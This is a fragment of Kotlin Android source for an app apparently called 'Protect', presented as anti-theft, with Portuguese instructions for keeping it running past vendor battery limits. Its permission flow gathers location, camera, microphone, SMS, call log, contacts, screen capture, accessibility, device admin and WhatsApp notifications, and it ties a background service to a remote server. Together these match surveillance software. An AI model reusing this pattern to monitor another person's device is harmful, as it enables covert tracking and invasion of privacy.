            detectBrandConfig(manufacturer, brand)
        }

        // Só exibe se detectamos uma marca específica
        if (title.isBlank()) return

        SectionCard {
            Label("COMPATIBILIDADE ${Build.MANUFACTURER.uppercase()}")
            Spacer(Modifier.height(8.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(emoji, fontSize = 22.sp)
                Spacer(Modifier.width(8.dp))
                Text(title, color = Color(0xFFFFD700), fontSize = 13.sp, fontWeight = FontWeight.Bold)
            }
            Spacer(Modifier.height(8.dp))
            steps.forEachIndexed { i, step ->
                Text(
                    "${i + 1}. $step",
                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 16.sp,
                    modifier = Modifier.padding(bottom = 2.dp)
                )
            }
            if (settingsIntent != null) {
                Spacer(Modifier.height(10.dp))
                Button(
                    onClick = {
                        try { startActivity(settingsIntent) }
                        catch (e: Exception) {
                            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = android.net.Uri.fromParts("package", packageName, null)
                            })
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1B2B4B))
                ) {
                    Text("⚙️  Abrir Configurações de Bateria", color = Color(0xFFFFD700), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }

    /** Retorna (emoji, título, passos, Intent) específicos para o fabricante. */
    private fun detectBrandConfig(manufacturer: String, brand: String): BrandConfig {
        return when {
            // ── Xiaomi / MIUI / Poco / Redmi ──────────────────────────────
            "xiaomi" in manufacturer || "redmi" in brand || "poco" in brand -> BrandConfig(
                emoji = "📱",
                title = "Xiaomi/MIUI: Ative o Início Automático",
                steps = listOf(
                    "Abra 'Segurança' → 'Início automático'",
                    "Ative 'Protect' na lista",
                    "Em 'Bateria' → 'Economizador de bateria' → 'Sem restrições' para Protect",
                    "Desative 'Otimização de MIUI' em Sobre o telefone (se disponível)"
                ),
                settingsIntent = miuiBatteryIntent()
            )
            // ── Huawei / EMUI / Honor ──────────────────────────────────────
            "huawei" in manufacturer || "honor" in brand -> BrandConfig(
                emoji = "📱",
                title = "Huawei/EMUI: App Protegido",
                steps = listOf(
                    "Abra 'Gerenciador de Telefone' → 'Aplicativos protegidos'",
                    "Ative a proteção para 'Protect'",
                    "Em 'Configurações de bateria' → desative otimização para Protect",
                    "Vá em Configurações → Apps → Protect → Permissões → Início automático"
                ),
                settingsIntent = huaweiBatteryIntent()
            )
            // ── Samsung / OneUI ────────────────────────────────────────────
            "samsung" in manufacturer -> BrandConfig(
                emoji = "📱",
                title = "Samsung OneUI: Bateria em Segundo Plano",
                steps = listOf(
                    "Configurações → Cuidados do dispositivo → Bateria",
                    "Toque nos 3 pontos → Configurações → Apps em suspensão",
                    "Remova 'Protect' da lista de apps suspensos",
                    "Em Apps → Protect → Bateria → selecione 'Sem restrições'"
                ),
                settingsIntent = samsungBatteryIntent()
            )
            // ── Oppo / ColorOS / Realme ────────────────────────────────────
            "oppo" in manufacturer || "realme" in brand -> BrandConfig(
                emoji = "📱",
                title = "Oppo/Realme: Gerenciador de Inicialização",
                steps = listOf(
                    "Configurações → Bateria → Outros → Modo de energia de app",
                    "Selecione 'Protect' → 'Sem restrições'",
                    "Configurações → Gerenciamento de Apps → Protect → Inicialização automática → Ativar"
                ),
                settingsIntent = oppoBatteryIntent()
            )
            // ── Vivo / FuntouchOS / OriginOS ──────────────────────────────
            "vivo" in manufacturer -> BrandConfig(
                emoji = "📱",
                title = "Vivo: Consumo de Energia em Segundo Plano",
                steps = listOf(
                    "Configurações → Bateria → Gerenciar consumo de energia de app",
                    "Selecione 'Protect' → 'Não restringir'",
                    "Configurações → Apps → Protect → Permissões → Execução em segundo plano → Ativar"
                ),
                settingsIntent = vivoBatteryIntent()
            )
            // ── OnePlus / OxygenOS ─────────────────────────────────────────
            "oneplus" in manufacturer -> BrandConfig(
                emoji = "📱",
                title = "OnePlus: App Auto-Launch",
                steps = listOf(
                    "Configurações → Bateria → Otimização de bateria",
                    "Selecione 'Protect' → 'Não otimizar'",
                    "Configurações → Apps → Protect → permissão de inicialização automática"
                ),
                settingsIntent = genericBatteryIntent()
            )
            // ── Motorola ───────────────────────────────────────────────────
            "motorola" in manufacturer || "moto" in brand -> BrandConfig(
                emoji = "📱",
                title = "Motorola: Bateria Adaptativa",
                steps = listOf(
                    "Configurações → Bateria → Gerenciamento de bateria",
                    "Desative 'Bateria adaptativa' OU adicione Protect às exceções",
                    "Configurações → Apps → Protect → Bateria → Sem restrições"
                ),
                settingsIntent = genericBatteryIntent()
            )
            else -> BrandConfig("", "", emptyList(), null)
        }
    }

    private data class BrandConfig(
        val emoji: String,
        val title: String,
        val steps: List<String>,
        val settingsIntent: Intent?
    )

    /**
     * Retorna o intent adequado para a tela de escolha de otimização de bateria,
     * detectando automaticamente o fabricante.
     */
    private fun batteryOptimizationIntent(): Intent {
        val mfr = Build.MANUFACTURER.lowercase()
        val br  = Build.BRAND.lowercase()
        return when {
            "xiaomi" in mfr || "redmi" in br || "poco" in br -> miuiBatteryIntent()
            "huawei" in mfr || "honor" in br                 -> huaweiBatteryIntent()
            else                                              -> genericBatteryIntent()
        }
    }

    private fun miuiBatteryIntent(): Intent {
        // A tela "SubSettings" com BatteryOptimizationFragment não filtra pelo
        // extra "package" em MIUI/HyperOS — ela resolve, mas abre os detalhes de
        // bateria do último app visitado (tela ERRADA, ex.: outro app instalado).
        // A opção confiável é a lista de otimização de bateria do próprio Android,
        // onde o usuário busca "Protect" e seleciona "Sem restrições".
        return genericBatteryIntent()
    }

    private fun huaweiBatteryIntent() = runCatching {
        Intent().apply {
            component = android.content.ComponentName(
                "com.huawei.systemmanager",
                "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
            )
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
    }.getOrElse { genericBatteryIntent() }

    private fun samsungBatteryIntent() = runCatching {
        Intent().apply {
            component = android.content.ComponentName(
                "com.samsung.android.lool",
                "com.samsung.android.sm.battery.ui.BatteryActivity"
            )
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
    }.getOrElse { genericBatteryIntent() }

    private fun oppoBatteryIntent() = runCatching {
        Intent().apply {
            component = android.content.ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgauge.PowerUsageSummary"
            )
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
    }.getOrElse { genericBatteryIntent() }

    private fun vivoBatteryIntent() = runCatching {
        Intent().apply {
            component = android.content.ComponentName(
                "com.vivo.abe",
                "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity"
            )
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
    }.getOrElse { genericBatteryIntent() }

    private fun genericBatteryIntent(): Intent {
        // ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS abre a lista de todos os apps
        // onde o usuário pode encontrar e configurar o Protect.
        // Não usar ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS: no Xiaomi/MIUI e Android 14+
        // esse intent abre a tela de detalhes de bateria de um app ERRADO (tela errada).
        return Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
    }

    // ── Shared composables ────────────────────────────────────────────────────
    @Composable
    fun SectionCard(content: @Composable ColumnScope.() -> Unit) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 20.dp)
                .border(1.dp, Color(0xFF252630), RoundedCornerShape(16.dp)),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
            shape = RoundedCornerShape(16.dp)
        ) { Column(Modifier.padding(20.dp), content = content) }
    }

    @Composable
    fun Label(text: String) =
        Text(text, fontSize = 11.sp, color = Color(0xFF8E94A5), fontWeight = FontWeight.Bold, letterSpacing = 1.sp)

    @Composable
    fun StatusBadge(active: Boolean) =
        Box(
            Modifier
                .background(if (active) Color(0xFF1E3A24) else Color(0xFF3A1E24), RoundedCornerShape(50.dp))
                .padding(horizontal = 14.dp, vertical = 6.dp)
        ) {
            Text(
                if (active) "ATIVO" else "INATIVO",
                color = if (active) Color(0xFF39FF14) else Color(0xFFFF3838),
                fontSize = 11.sp, fontWeight = FontWeight.Bold
            )
        }

    @Composable
    fun PermRow(label: String, granted: Boolean) {
        Row(
            Modifier.fillMaxWidth().padding(vertical = 6.dp),
            Arrangement.SpaceBetween, Alignment.CenterVertically
        ) {
            Text(label, color = Color.White, fontSize = 13.sp, modifier = Modifier.weight(1f))
            if (granted) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(17.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("OK", color = Color(0xFF39FF14), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }
            } else {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Warning, null, tint = Color(0xFFFF9900), modifier = Modifier.size(17.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Pendente", color = Color(0xFFFF9900), fontSize = 12.sp)
                }
            }
        }
    }

    @Composable
    fun neonOutlinedColors() = OutlinedTextFieldDefaults.colors(
        focusedBorderColor = Color(0xFF00D2FF),
        unfocusedBorderColor = Color(0xFF252630),
        focusedLabelColor = Color(0xFF00D2FF),
        cursorColor = Color(0xFF00D2FF),
        focusedTextColor = Color.White,
        unfocusedTextColor = Color.White
    )

    // ── Private helpers ───────────────────────────────────────────────────────
    private fun launchService() {
        AntiTheftService.serverIpAddress = SERVER_HOST
        AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
        prefs.edit().putString("server_ip", SERVER_HOST).putBoolean("auto_start", true).apply()
        val intent = Intent(this, AntiTheftService::class.java).putExtra("SERVER_IP", SERVER_HOST)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        } catch (e: Exception) { Log.e("MainActivity", "Start service failed: ${e.message}") }
    }

    private fun startPermissionFlow() {
        val basicNeeded = buildList {
            if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                add(Manifest.permission.ACCESS_FINE_LOCATION)
                add(Manifest.permission.ACCESS_COARSE_LOCATION)
            }
            if (!hasPermission(Manifest.permission.CAMERA))         add(Manifest.permission.CAMERA)
            if (!hasPermission(Manifest.permission.RECORD_AUDIO))   add(Manifest.permission.RECORD_AUDIO)
            if (!hasPermission(Manifest.permission.READ_PHONE_STATE))   add(Manifest.permission.READ_PHONE_STATE)
            // READ_PHONE_NUMBERS: necessário em Android 8+ para ler o número da linha
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                !hasPermission(Manifest.permission.READ_PHONE_NUMBERS)) add(Manifest.permission.READ_PHONE_NUMBERS)
            if (!hasPermission(Manifest.permission.RECEIVE_SMS))    add(Manifest.permission.RECEIVE_SMS)
            if (!hasPermission(Manifest.permission.READ_SMS))       add(Manifest.permission.READ_SMS)
            if (!hasPermission(Manifest.permission.READ_CALL_LOG))  add(Manifest.permission.READ_CALL_LOG)
            if (!hasPermission(Manifest.permission.READ_CONTACTS))  add(Manifest.permission.READ_CONTACTS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                !hasPermission(Manifest.permission.ACTIVITY_RECOGNITION)
            ) add(Manifest.permission.ACTIVITY_RECOGNITION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                !hasPermission(Manifest.permission.POST_NOTIFICATIONS)
            ) add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (basicNeeded.isNotEmpty()) {
            Handler(Looper.getMainLooper()).postDelayed({
                basicPermLauncher.launch(basicNeeded.toTypedArray())
            }, 500)
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            ) {
                Handler(Looper.getMainLooper()).postDelayed({
                    bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                }, 500)
            } else {
                scheduleScreenCaptureRequest()
            }
        }
    }

    private fun scheduleScreenCaptureRequest(extraDelayMs: Long = 600) {
        Handler(Looper.getMainLooper()).postDelayed({
            if (!prefs.getBoolean("screen_perm_granted", false)) {
                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
            }
        }, extraDelayMs)
    }

    private fun refreshPermStates() {
        hasLocationState.value      = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        hasBgLocationState.value    = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else true
        hasCameraState.value        = hasPermission(Manifest.permission.CAMERA)
        hasMicState.value           = hasPermission(Manifest.permission.RECORD_AUDIO)
        hasNotifyState.value        = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            hasPermission(Manifest.permission.POST_NOTIFICATIONS) else true
        hasScreenState.value        = ProtectAccessibilityService.isEnabled(this) ||
            (prefs.getBoolean("screen_perm_granted", false) && AntiTheftService.mediaProjectionData != null)
        hasAccessibilityState.value = ProtectAccessibilityService.isEnabled(this)
        hasAdminState.value         = devicePolicyManager.isAdminActive(adminComponent)
        hasPhoneState.value         = hasPermission(Manifest.permission.READ_PHONE_STATE)
        hasSmsState.value           = hasPermission(Manifest.permission.RECEIVE_SMS)
        hasActivityState.value      = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            hasPermission(Manifest.permission.ACTIVITY_RECOGNITION) else true
        hasWhatsAppListenerState.value = WhatsAppNotificationListener.isEnabled(this)
    }

    private fun hasPermission(p: String) =
        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }
}

fun isBatteryOptimizedFor(context: Context): Boolean {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return !pm.isIgnoringBatteryOptimizations(context.packageName)
    }
    return false
}

@Composable
fun AndroidProtectTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF00D2FF), secondary = Color(0xFFFF2A85),
            background = Color(0xFF0A0B10), surface = Color(0xFF12141D)
        ),
        content = content
    )
}
